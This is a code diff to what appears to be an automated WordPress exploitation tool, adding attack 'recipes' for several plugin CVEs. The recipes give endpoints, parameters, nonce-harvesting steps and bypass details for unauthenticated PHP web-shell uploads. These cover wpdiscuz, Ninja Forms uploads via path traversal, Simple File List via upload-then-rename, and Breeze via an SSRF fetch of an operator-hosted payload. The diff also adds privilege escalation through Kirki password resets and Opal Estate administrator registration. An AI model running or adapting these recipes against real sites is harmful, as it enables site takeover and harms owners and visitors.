@@ -19,11 +19,23 @@ RECIPES = [
         "affected": ">=7.0.0,<=7.0.4",
         "method": "POST",
         "endpoint": "/wp-admin/admin-ajax.php",
-        "params": {"action": "wmuUploadFiles", "wmu_nonce": ""},
+        "params": {"action": "wmuUploadFiles"},
         "field": "wmu_files[0]",
         "upload_path": "/wp-content/uploads/{filename}",
+        # wmuUploadFiles is gated by check_ajax_referer() -- confirmed live: an
+        # empty/missing nonce gets rejected with WP's own wp_die(-1, 403), not
+        # a plugin-specific error. The real nonce is wp_create_nonce()'d into
+        # wpdiscuzAjaxObj.wmuSecurity via wp_localize_script wherever wpdiscuz's
+        # comment form renders (any post/page with comments open). Default
+        # harvest page is the homepage; on sites with a static front page
+        # (no post listing there), point 'url' at an actual single-post
+        # permalink instead.
+        "nonce_from": {"url": "/", "key": "wmuSecurity", "param": "wmu_nonce"},
         "source": "registry",
-        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
+        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/. "
+                "Needs a real wmuSecurity nonce harvested from a page where "
+                "wpdiscuz's comment form renders -- an empty nonce is rejected "
+                "outright by check_ajax_referer().",
     },
     {
         "plugin": "revslider",
@@ -45,6 +57,123 @@ RECIPES = [
         # on any revslider — VERIFY (confirmed exec) is what keeps it honest.
         "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
                 "a PHP shell inside revslider/. Unauth in <=3.0.95.",
+    },
+    {
+        "plugin": "ninja-forms-uploads",
+        "cve": "CVE-2026-0740",
+        "affected": "<=3.3.24",
+        "mode": "nonce-traversal",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "nf_fu_upload"},
+        "nonce_action": "nf_fu_get_new_nonce",
+        "upload_action": "nf_fu_upload",
+        "field": "files-{field_id}",
+        "dest_param": "image_jpg",
+        "traversal_prefix": "../",
+        "upload_path": "/wp-content/uploads/ninja-forms/{filename}",
+        "source": "registry",
+        # Verified against the public PoC (github.com/whattheslime/CVE-2026-0740)
+        # and Lexfo's write-up: nf_fu_get_new_nonce hands a valid upload nonce to
+        # ANY caller for an arbitrary field_id (no auth, no ownership check), then
+        # nf_fu_upload trusts the client-supplied 'image_jpg' destination verbatim
+        # into move_uploaded_file() (CWE-434) — one '../' escapes the tmp/ landing
+        # dir into the plugin's own uploads dir. Traversal + arbitrary extension
+        # (.php) only works <=3.3.24; 3.3.25/3.3.26 close traversal but still allow
+        # .phtml/.phar/.pht uploads (not built here) before the full fix in 3.3.27.
+        "note": "nf_fu_get_new_nonce(field_id) mints an upload nonce unauth; "
+                "nf_fu_upload trusts the client's 'image_jpg' destination path "
+                "verbatim → path traversal out of wp-content/uploads/ninja-forms/"
+                "tmp/. Confirmed <=3.3.24 (later versions gate traversal, not extension).",
+    },
+    {
+        "plugin": "simple-file-list",
+        "cve": "CVE-2025-34085",
+        "affected": "<=4.2.2",
+        "mode": "upload-then-rename",
+        "method": "POST",
+        "endpoint": "/wp-content/plugins/simple-file-list/ee-upload-engine.php",
+        "rename_endpoint": "/wp-content/plugins/simple-file-list/ee-file-engine.php",
+        "params": {"eeSFL_ID": "1"},
+        "list_id": "1",
+        "upload_dir": "/wp-content/uploads/simple-file-list/",
+        "token_salt": "unique_salt",
+        "rename_extensions": ["php", "phtml", "php5", "php3"],
+        "field": "file",
+        "upload_path": "/wp-content/uploads/simple-file-list/{filename}",
+        "source": "registry",
+        # Verified against the real vulnerable source (v4.2.2, both
+        # ee-upload-engine.php and ee-file-engine.php): BOTH endpoints
+        # register their nonce check via add_action('plugins_loaded',
+        # 'eeSFL_CheckNonce') -- but that runs mid-script, AFTER each script's
+        # own manual `include(wp-load.php)` bootstrap has already fired
+        # plugins_loaded, so the callback is registered too late and NEVER
+        # actually runs. No nonce required at all despite the code appearing
+        # to check one. Upload is extension-whitelisted (png passes), but the
+        # separate rename endpoint (eeFileAction=f"Rename|{new_name}") applies
+        # ZERO validation to the new extension -- rename png→php and it's a
+        # live shell. The upload 'security token' is
+        # md5('unique_salt' + $_POST['eeSFL_Timestamp']) -- a literal string
+        # hardcoded in the public plugin source, computed locally here.
+        "note": "Unauth upload (extension-whitelisted) + unauth rename (zero "
+                "validation) = arbitrary PHP execution. Both endpoints' nonce "
+                "checks are dead code (registered on plugins_loaded AFTER that "
+                "hook already fired in the script's own bootstrap); the "
+                "upload token is a hardcoded salt in the plugin source, not a "
+                "real secret.",
+    },
+    {
+        "plugin": "breeze",
+        "cve": "CVE-2026-3844",
+        "affected": "<=2.4.4",
+        "mode": "comment-avatar-ssrf",
+        "method": "POST",
+        "endpoint": "/wp-comments-post.php",
+        "params": {},
+        "author_field": "author",
+        "post_id": 1,
+        "field": "author",
+        "upload_path": "/wp-content/cache/breeze-extra/gravatars/{filename}",
+        "source": "registry",
+        # REAL FARM MATCH (2026-07-17): an admin found
+        # wp-content/cache/breeze-extra/gravatars/footer.jpg.php on the
+        # actual compromised farm -- an exact match for this CVE's path and
+        # the classic double-extension shell-naming pattern. Verified against
+        # BOTH the current patched source and the actual vulnerable 2.4.4
+        # source (wp.org SVN): fetch_gravatar_from_remote() in <=2.4.4 does
+        # zero host/MIME/extension validation and resolves to exactly
+        # content_url('/cache/breeze-extra/gravatars/' . $blog_id .
+        # $gravatar_name) -- the patched version added a gravatar.com host
+        # check + an image/jpeg|png|gif whitelist.
+        #
+        # UNLIKE every other recipe here, this is SSRF-shaped: WE inject a
+        # URL, the TARGET fetches it -- so the payload must be reachable BY
+        # THE TARGET, not just describable by us. pentest-agent cannot
+        # conjure that reachability itself. Operator must host a payload
+        # (generate one with `python3 -c "from wp.exploit import
+        # build_payload; print(build_payload())"` so its token matches what
+        # wp_verify expects) somewhere the target can reach, then pass
+        # --callback-url <that URL> --callback-token <that token>.
+        #
+        # Mechanism (verified against the real PoC, github.com/dinosn/
+        # CVE-2026-3844): POST a comment to wp-comments-post.php with
+        # author=f"x srcset={callback_url}" (get_avatar()'s $alt param is
+        # populated from the comment author name; breeze_replace_gravatar_
+        # image()'s regex scans the resulting avatar HTML for a srcset/src
+        # value with no regard for which HTML attribute it came from), then
+        # visit the post page to trigger get_avatar -> fetch_gravatar_from_
+        # remote() -> download with zero validation.
+        #
+        # PRECONDITION (per the public writeups, not yet independently
+        # re-derived from source here): "Host Files Locally - Gravatars"
+        # setting must be enabled (non-default) + comments open on >=1 post.
+        "note": "Unauth SSRF-triggered fetch via a comment's forged srcset -> "
+                "fetch_gravatar_from_remote() saves ANY URL with zero MIME/"
+                "extension check. REQUIRES an operator-hosted payload "
+                "(--callback-url/--callback-token) since the target fetches "
+                "the file itself; pentest-agent can't host it for you. Also "
+                "requires 'Host Files Locally - Gravatars' enabled (non-"
+                "default) and comments open on the target post.",
     },
 ]
 
@@ -109,14 +238,62 @@ PRIVESC_RECIPES = [
             "emailBody": '[{"type":"text","value":"Reset your password:\\n"},'
                          '{"type":"chip","value":"reset_link"}]',
         },
-        # WP REST nonce; the endpoint's missing-permission check usually ignores
-        # it, but send one when a page exposes it (wpApiSettings).
+        # PRECONDITION (confirmed from source, live-tested): the permission
+        # check IS a no-op (get_item_permissions_check() -> true), but
+        # validate_nonce() strictly requires wp_verify_nonce($nonce,
+        # 'KirkiComponentLibrary_kirki-forgot-password') -- a nonce scoped to
+        # THIS exact action. That nonce is only ever minted by
+        # ElementGenerator::add_nonce_to_element(), which only fires while
+        # rendering a page built with Kirki's own page-builder ("ComponentLibrary")
+        # that actually places a Login/Register/Forgot-Password/Change-Password/
+        # Retrieve-Username/Comment element on it. A vanilla kirki install with
+        # no such page has NO page anywhere that exposes a validly-scoped nonce
+        # -- the generic homepage/wpApiSettings nonce this harvester finds is
+        # for a different action and will always fail wp_verify_nonce() here.
+        # So despite SCAN's "self-contained unauth" classification (heuristic,
+        # not a weaponizability guarantee -- see wp_vulns.precondition), this
+        # CVE is only reachable on sites that built such a component-library
+        # page. If you've confirmed the real target has one, scrape ITS nonce
+        # (component_lib_forms[...].nonce in that page's inline JS) and set a
+        # static "nonce" field here to override the harvester.
         "nonce_header": "X-WP-ELEMENT-NONCE",
         "success_marker": "Email sent",
         "source": "registry",
         "note": "Unauth arbitrary-email password reset (CVE-2026-8206, missing "
                 "permission check). Confirm-only: reset link is emailed to the "
-                "attacker; finish takeover from that mailbox.",
+                "attacker; finish takeover from that mailbox. REQUIRES the "
+                "target to have a Kirki page-builder page with a Forgot-"
+                "Password (or sibling) ComponentLibrary element -- otherwise "
+                "no page ever exposes the action-scoped nonce validate_nonce() "
+                "demands, and the request fails 'Not authorized' even though "
+                "the permission check itself is real and missing.",
+    },
+    {
+        "plugin": "opal-estate-pro",
+        "cve": "CVE-2025-6934",
+        "affected": "<=1.7.5",
+        "kind": "register-role",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "action": "opalestate_register_form",
+        "user_field": "username",
+        "email_field": "email",
+        "pass_field": "password",
+        "pass_confirm_field": "password1",
+        "role_param": "role",
+        "role_value": "administrator",
+        # on_regiser_user's nonce check reads this hidden input off the site's
+        # own homepage (not a separate /register/ page) — confirmed from the
+        # public PoC (github.com/Nxploited/CVE-2025-6934).
+        "nonce_from": {"url": "/", "field": "opalestate-register-nonce"},
+        "extra_params": {
+            "confirmed_register": "on",
+            "_wp_http_referer": "/",
+            "ajax": "1",
+        },
+        "source": "registry",
+        "note": "on_regiser_user doesn't restrict the 'role' param during "
+                "registration (CWE-269) → unauth attacker-chosen role, "
+                "including administrator.",
     },
 ]
 
